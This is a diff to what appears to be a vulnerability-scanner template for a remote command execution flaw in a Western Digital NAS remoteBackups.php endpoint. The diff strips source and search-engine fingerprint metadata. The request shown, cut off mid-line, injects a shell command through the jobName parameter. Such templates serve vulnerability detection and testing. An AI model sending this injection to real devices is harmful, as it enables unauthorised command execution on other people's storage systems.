@@ -3,12 +3,8 @@ info:
   name: 西部数据 NAS remoteBackups.php 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gu7n6hy00k3lfbed'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gu7n6hy00k3lfbed
-    fofa: icon_hash="-1074357885"
 http:
 - raw:
   - 'GET /web/php/remoteBackups.php?cmd=getRecoverItems&jobName=";id;" HTTP/1.1
